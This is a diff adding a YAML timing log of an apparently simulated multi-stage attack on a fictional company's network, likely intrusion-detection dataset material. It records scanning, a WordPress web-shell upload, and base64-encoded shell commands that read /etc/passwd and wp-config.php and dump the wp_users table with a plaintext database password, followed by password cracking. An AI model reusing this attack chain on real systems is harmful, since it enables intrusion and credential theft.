@@ -1,0 +1,298 @@
+start: "2022-01-17T11:15:00.051Z"
+stop: "2022-01-17T11:24:16.202Z"
+
+vpn_connect: 
+    start: "2022-01-17T11:15:00.051Z"
+    stop: "2022-01-17T11:15:04.342Z"
+
+traceroute:
+    start: "2022-01-17T11:15:09.431Z"
+    stop: "2022-01-17T11:15:09.466Z"
+
+host_discover_local: 
+    start: "2022-01-17T11:21:21.208Z"
+    stop: "2022-01-17T11:21:24.236Z"
+    networks: ["192.168.104.0/24"]
+
+
+host_discover_dmz: 
+    start: "2022-01-17T11:15:11.867Z"
+    stop: "2022-01-17T11:20:55.340Z"
+    networks: ["172.21.128.0/19"]
+
+dns_brute_force_start:
+    start: "2022-01-17T11:21:09.015Z"
+    stop: "2022-01-17T11:21:10.536Z"
+    domain: "smith.santos.com"
+    dns_servers: ["172.21.128.1"]
+
+service_scan: 
+    start: "2022-01-17T11:21:32.076Z"
+    stop: "2022-01-17T11:21:48.661Z"
+    networks: ["192.168.104.218", "10.229.255.254", "192.168.104.155", "172.21.128.54", "172.21.131.50"]
+
+wpscan: 
+    start: "2022-01-17T11:22:21.080Z"
+    stop: "2022-01-17T11:22:47.793Z"
+    url: "https://intranet.smith.santos.com"
+    failed: False
+
+dirb_scan: 
+    start: "2022-01-17T11:22:02.366Z"
+    stop: "2022-01-17T11:22:14.523Z"
+    urls: ["https://intranet.smith.santos.com"]
+
+upload_rce_shell:
+    url: "https://intranet.smith.santos.com"
+    admin_ajax: "https://intranet.smith.santos.com/wp-admin/admin-ajax.php"
+    image_name: "yvmuplzucm.php"
+    post_id: "5"
+    post_url: "https://intranet.smith.santos.com/?p=5"
+    web_shell: "https://intranet.smith.santos.com/wp-content/uploads/2022/01/yvmuplzucm-1642418578.1653.php"
+    start: "2022-01-17T11:22:57.146Z"
+    stop: "2022-01-17T11:23:00.332Z"
+    load_posts_page: 
+        start: "2022-01-17T11:22:57.146Z"
+        stop: "2022-01-17T11:22:57.268Z"
+    load_post_info:
+        start: "2022-01-17T11:22:57.282Z"
+        stop: "2022-01-17T11:22:57.507Z"
+    upload:
+        start: "2022-01-17T11:22:58.090Z"
+        stop: "2022-01-17T11:23:00.332Z"
+
+host_recon_commands:
+
+    - id: "list_www"
+      start: "2022-01-17T11:23:00.335Z"
+      stop: "2022-01-17T11:23:00.452Z"
+      http_param: 
+        name: "wp_meta"
+        value: "WyJscyIsICItbCIsICIvdmFyL3d3dyJd"
+      cmd: ["ls", "-l", "/var/www"]
+
+    - id: "check_user_id"
+      start: "2022-01-17T11:23:03.505Z"
+      stop: "2022-01-17T11:23:03.605Z"
+      http_param: 
+        name: "wp_meta"
+        value: "WyJpZCJd"
+      cmd: ["id"]
+
+    - id: "check_id"
+      start: "2022-01-17T11:23:07.250Z"
+      stop: "2022-01-17T11:23:07.390Z"
+      http_param: 
+        name: "wp_meta"
+        value: "WyJpZCJd"
+      cmd: ["id"]
+
+    - id: "check_netstat_nat"
+      start: "2022-01-17T11:23:11.347Z"
+      stop: "2022-01-17T11:23:11.475Z"
+      http_param: 
+        name: "wp_meta"
+        value: "WyJuZXRzdGF0IiwgIi1uYXQiXQ=="
+      cmd: ["netstat", "-nat"]
+
+    - id: "check_whoami"
+      start: "2022-01-17T11:23:14.746Z"
+      stop: "2022-01-17T11:23:14.858Z"
+      http_param: 
+        name: "wp_meta"
+        value: "WyJ3aG9hbWkiXQ=="
+      cmd: ["whoami"]
+
+    - id: "check_date"
+      start: "2022-01-17T11:23:16.507Z"
+      stop: "2022-01-17T11:23:16.605Z"
+      http_param: 
+        name: "wp_meta"
+        value: "WyJkYXRlIl0="
+      cmd: ["date"]
+
+    - id: "check_meminfo"
+      start: "2022-01-17T11:23:19.160Z"
+      stop: "2022-01-17T11:23:19.257Z"
+      http_param: 
+        name: "wp_meta"
+        value: "WyJjYXQiLCAiL3Byb2MvbWVtaW5mbyJd"
+      cmd: ["cat", "/proc/meminfo"]
+
+    - id: "check_netstat_l"
+      start: "2022-01-17T11:23:21.140Z"
+      stop: "2022-01-17T11:23:21.255Z"
+      http_param: 
+        name: "wp_meta"
+        value: "WyJuZXRzdGF0IiwgIi1sIl0="
+      cmd: ["netstat", "-l"]
+
+    - id: "check_who"
+      start: "2022-01-17T11:23:22.841Z"
+      stop: "2022-01-17T11:23:22.938Z"
+      http_param: 
+        name: "wp_meta"
+        value: "WyJ3aG8iXQ=="
+      cmd: ["who"]
+
+    - id: "check_pwd"
+      start: "2022-01-17T11:23:26.208Z"
+      stop: "2022-01-17T11:23:26.307Z"
+      http_param: 
+        name: "wp_meta"
+        value: "WyJwd2QiXQ=="
+      cmd: ["pwd"]
+
+    - id: "clear"
+      start: "2022-01-17T11:23:28.964Z"
+      stop: "2022-01-17T11:23:29.083Z"
+      http_param: 
+        name: "wp_meta"
+        value: "WyJjbGVhciJd"
+      cmd: ["clear"]
+
+    - id: "check_network_config"
+      start: "2022-01-17T11:23:31.348Z"
+      stop: "2022-01-17T11:23:31.502Z"
+      http_param: 
+        name: "wp_meta"
+        value: "WyJpcCIsICJhZGRyIl0="
+      cmd: ["ip", "addr"]
+
+    - id: "list_l"
+      start: "2022-01-17T11:23:35.239Z"
+      stop: "2022-01-17T11:23:35.337Z"
+      http_param: 
+        name: "wp_meta"
+        value: "WyJscyIsICItbCJd"
+      cmd: ["ls", "-l"]
+
+    - id: "check_uname_r"
+      start: "2022-01-17T11:23:37.536Z"
+      stop: "2022-01-17T11:23:37.630Z"
+      http_param: 
+        name: "wp_meta"
+        value: "WyJ1bmFtZSIsICItciJd"
+      cmd: ["uname", "-r"]
+
+    - id: "check_ps_a"
+      start: "2022-01-17T11:23:39.857Z"
+      stop: "2022-01-17T11:23:39.960Z"
+      http_param: 
+        name: "wp_meta"
+        value: "WyJwcyIsICItQSJd"
+      cmd: ["ps", "-A"]
+
+    - id: "read_resolv"
+      start: "2022-01-17T11:23:41.654Z"
+      stop: "2022-01-17T11:23:41.754Z"
+      http_param: 
+        name: "wp_meta"
+        value: "WyJjYXQiLCAiL2V0Yy9yZXNvbHYuY29uZiJd"
+      cmd: ["cat", "/etc/resolv.conf"]
+
+    - id: "check_last"
+      start: "2022-01-17T11:23:43.552Z"
+      stop: "2022-01-17T11:23:43.657Z"
+      http_param: 
+        name: "wp_meta"
+        value: "WyJsYXN0Il0="
+      cmd: ["last"]
+
+    - id: "check_uptime"
+      start: "2022-01-17T11:23:45.248Z"
+      stop: "2022-01-17T11:23:45.363Z"
+      http_param: 
+        name: "wp_meta"
+        value: "WyJ1cHRpbWUiXQ=="
+      cmd: ["uptime"]
+
+    - id: "read_passwd"
+      start: "2022-01-17T11:23:48.832Z"
+      stop: "2022-01-17T11:23:48.935Z"
+      http_param: 
+        name: "wp_meta"
+        value: "WyJjYXQiLCAiL2V0Yy9wYXNzd2QiXQ=="
+      cmd: ["cat", "/etc/passwd"]
+
+    - id: "check_release"
+      start: "2022-01-17T11:23:51.190Z"
+      stop: "2022-01-17T11:23:51.453Z"
+      http_param: 
+        name: "wp_meta"
+        value: "WyJsc2JfcmVsZWFzZSIsICItYSJd"
+      cmd: ["lsb_release", "-a"]
+
+    - id: "check_netstat_t"
+      start: "2022-01-17T11:23:54.733Z"
+      stop: "2022-01-17T11:23:54.845Z"
+      http_param: 
+        name: "wp_meta"
+        value: "WyJuZXRzdGF0IiwgIi10Il0="
+      cmd: ["netstat", "-t"]
+
+    - id: "check_df"
+      start: "2022-01-17T11:23:57.425Z"
+      stop: "2022-01-17T11:23:57.548Z"
+      http_param: 
+        name: "wp_meta"
+        value: "WyJkZiIsICItaCJd"
+      cmd: ["df", "-h"]
+
+    - id: "list_web_dir"
+      start: "2022-01-17T11:23:59.247Z"
+      stop: "2022-01-17T11:23:59.501Z"
+      http_param: 
+        name: "wp_meta"
+        value: "WyJscyIsICItbGFSIiwgIi92YXIvd3d3Il0="
+      cmd: ["ls", "-laR", "/var/www"]
+
+    - id: "check_uname_a"
+      start: "2022-01-17T11:24:01.058Z"
+      stop: "2022-01-17T11:24:01.159Z"
+      http_param: 
+        name: "wp_meta"
+        value: "WyJ1bmFtZSIsICItYSJd"
+      cmd: ["uname", "-a"]
+
+    - id: "list_home"
+      start: "2022-01-17T11:24:04.144Z"
+      stop: "2022-01-17T11:24:04.248Z"
+      http_param: 
+        name: "wp_meta"
+        value: "WyJscyIsICItbCIsICIvaG9tZSJd"
+      cmd: ["ls", "-l", "/home"]
+
+    - id: "read_group"
+      start: "2022-01-17T11:24:07.405Z"
+      stop: "2022-01-17T11:24:07.503Z"
+      http_param: 
+        name: "wp_meta"
+        value: "WyJjYXQiLCAiL2V0Yy9ncm91cCJd"
+      cmd: ["cat", "/etc/group"]
+
+    - id: "check_wp_config"
+      start: "2022-01-17T11:24:11.058Z"
+      stop: "2022-01-17T11:24:11.172Z"
+      http_param: 
+        name: "wp_meta"
+        value: "WyJjYXQiLCAiL3Zhci93d3cvaW50cmFuZXQuc21pdGguc2FudG9zLmNvbS93cC1jb25maWcucGhwIl0="
+      cmd: ["cat", "/var/www/intranet.smith.santos.com/wp-config.php"]
+
+    - id: "dump_wp_users"
+      start: "2022-01-17T11:24:14.061Z"
+      stop: "2022-01-17T11:24:14.343Z"
+      http_param: 
+        name: "wp_meta"
+        value: "WyJteXNxbCIsICItdSIsICJ3b3JkcHJlc3MiLCAiLXB0YWlub294M2FlZGVlU2giLCAid29yZHByZXNzX2RiIiwgIi1lIiwgIlwic2VsZWN0ICogZnJvbSB3cF91c2Vyc1wiIl0="
+      cmd: ["mysql", "-u", "wordpress", "-ptainoox3aedeeSh", "wordpress_db", "-e", "\"select * from wp_users\""]
+
+
+
+online_cracking:
+    start: "2022-01-17T11:24:16.202Z"
+    stop: "2022-01-17T11:57:35.619Z"
+
+run_cracking:
+    start: "2022-01-17T11:24:45.299Z"
+    stop: "2022-01-17T11:57:35.619Z"
